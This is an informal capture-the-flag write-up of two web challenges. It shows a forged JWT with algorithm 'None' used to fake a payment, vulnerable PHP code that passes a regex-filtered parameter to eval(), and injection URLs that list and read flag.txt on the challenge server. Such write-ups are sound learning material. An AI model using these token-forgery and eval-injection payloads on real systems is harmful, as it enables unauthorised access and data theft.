## web/spiderman
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/a6a4c660-0adb-4631-89df-c10807010354)
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/fc060cb6-a19e-487f-850b-78d122640d3c)
- on cliking buying product with id 1 of cost 1000
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/1548a2c6-1689-45f4-90b9-ab2135c8bd40)
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/1d8b7a35-9868-47e9-afb9-41ff3476dba1)

- we get a coolkie and on deconding
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/b80f4fd2-d8d2-4719-aa2b-61d115203e60)
- this is the checkout
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/17652ee6-2df8-4e22-a061-dc124c68648a)
- it is a get request with money
- on seding that get request we get payment successful
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/7c79ddde-0966-46b1-8f96-74b174432ab2)
- we change the sign to chekc
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/5bc17472-3e27-4328-95c2-1c410acd433e)
- so signature is verifed
- our balance is not changing after buying things
## even thoug the header and payload are same in both (buing,checkout) the signature is different(as of different secretes used maybe)
### try none on chekout
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/2b662a06-7239-4d0c-acf9-c4f3556d1ba5)
- eyJhbGciOiAiTm9uZSIsICJ0eXAiOiAiSldUIn0K.eyJhbW91bnQiOiA1MDAwfQo
- on complely removing the sign part we get a err
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/c7467c9a-c278-42cd-b7e2-389826673121)
- so we place a random char as sign
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/ce1ed63c-b684-4fe6-9232-fe6c067a7fa6)
- shaktictf{Y0u_4re_th3_ult1mat3_f4n}
# web/filters
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/2cb909ac-241e-48f5-ade7-944397e6df75)
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/a5e9c236-0d4d-4dbf-95f7-b1fda53e4624)
### try to read files
- use os.system ..to read the file like using readfile() ---can t use as of s
- file_Get_contnets() ---can't use as of c
- fgets()--need to open file with fopen()

## bypass try with pcre limit
![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/df0c8561-9a83-4ae7-b423-40d9ae6b3d8d)
https://stackoverflow.com/questions/17926195/php-preg-match-length-3276-limit
```

function filter($command) {
    if(preg_match('/(`|\.|\$|\/|a|c|s|require|include)/i', $command)) {
        return false;
    }
    return true;
}

if(filter($command)) {
    eval($command);
    echo "Command executed";
} else {
    echo "Restricted characters have been used";
}
```
- so here if our command is longer than this then pregmatch will return false
- as a reult if conditon willl not go through so filter will reurn true
- so we check by gibing 3276*innocent chars+1 evil char
- pcre recursion limit some say 10 million
- so write a python script
### says url tool long 
## bypass try with new line char
https://ramadistra.dev/fbctf-2019-rceservice
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp
but that is not working having %0A 
![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/d70bd095-33b3-4d17-bf88-dce49048e610)
- a help ful resoruce https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223

- as the regex is not evil/can't stuck in a loop ,there is no way of pcre recurison limit use and we bypassing the filter

### finding some useful commands
- from this https://ramadistra.dev/fbctf-2019-rceservice
- we see some useful commands (as ther are blockd)..
- so we say while(false),it is executed
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/f77b6dab-1a84-44f5-a23f-4719c2d0b80c)
### try highlight_file
- https://ctftime.org/writeup/16595
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/820dca9c-d42d-4a1a-8982-60ac7ad05dda)
- https://ctf-wiki.mahaloz.re/web/php/php/
### try exploit
- use fopen and _()
### try opendir()
![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/409f80a0-b829-4f48-a06b-7736375c868e)
### try readtext(listdir)
fopen(listdir())
- so we did executied glob('fl')
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/2a4d7d89-9430-48e4-9025-c95602a47e01)
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/ff996fb4-ed4a-4f1f-adf6-c7030297da19)
- it returns list of files
```
https://ch2474161007.ch.eng.run/?command=fopen(glob(%27fl%27)[0],%27r%27);
```
# print_r to get the output on the screne
![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/a2b5d6c7-24bc-4af8-a731-96f944d9a703)
```
https://ch2474161007.ch.eng.run/?command=print_r(glob(%27*fl*%27));
```
![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/b52145e5-c403-4b00-89b1-b3896976fc92)
```
https://ch2474161007.ch.eng.run/?command=print_r(glob(%27*fl*%27)[0]);
```
with this we do get the file name flag.txt
![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/5371dd6d-b892-4b70-aa48-459a310a2eaa)


# at last
https://www.w3schools.com/php/func_filesystem_file.asp
![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/f6983a82-4080-492e-a684-d7935688e5b6)
```
https://ch2474161007.ch.eng.run/?command=print_r(file(glob(%27*fl*%27)[0]));
Array ( [0] => shaktictf{y0u_byp4553d_7h3_f1l73r5_y4y} ) Command executed 
```



